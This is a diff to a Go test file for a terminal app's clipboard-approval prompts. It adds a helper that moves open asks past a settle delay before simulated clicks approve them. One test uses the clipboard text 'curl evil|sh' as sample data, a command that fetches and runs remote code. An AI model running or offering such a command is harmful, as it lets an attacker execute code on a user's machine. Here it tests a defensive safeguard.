@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"strings"
 	"testing"
+	"time"
 
 	tea "charm.land/bubbletea/v2"
 
@@ -93,6 +94,14 @@ func TestOSC52FromABackgroundPaneDoesNotReachTheHostClipboard(t *testing.T) {
 	}
 }
 
+// settleClipboardAsks puts every open ask past its settle, as the time a
+// person takes to read it would.
+func settleClipboardAsks(m *OS) {
+	for _, a := range m.clipboardAsks {
+		a.shown = time.Now().Add(-2 * clipboardAskSettle)
+	}
+}
+
 // clickAsk activates the dock message that asks for windowID's write, the way
 // a click on it does, and returns the write it allowed.
 func clickAsk(t *testing.T, m *OS, windowID string) []string {
@@ -101,6 +110,7 @@ func clickAsk(t *testing.T, m *OS, windowID string) []string {
 	if ask == nil {
 		t.Fatalf("no ask is open for %s", windowID)
 	}
+	settleClipboardAsks(m)
 	for _, n := range m.Notifications {
 		if n.Target != nil && n.Target.ClipboardAsk == ask.seq {
 			m.jumpToNotifTarget(*n.Target)
@@ -290,8 +300,10 @@ func TestClipboardAskClickApprovesOnlyTheDrawnText(t *testing.T) {
 		t.Fatalf("the ask does not show the new text: %q", lastMessage(m))
 	}
 
-	// The next frame draws the new text, and a click on it allows that text.
+	// The next frame draws the new text, and a click on it, after the
+	// settle, allows that text.
 	m.notifHit.Drawn = m.drawnCopy(m.Notifications[len(m.Notifications)-1])
+	settleClipboardAsks(m)
 	m.clickVisibleNotification()
 	if got := clipboardWrites(m.ClipboardApprovalCmd()); len(got) != 1 || got[0] != "curl evil|sh" {
 		t.Fatalf("a click on the drawn text allowed %q", got)
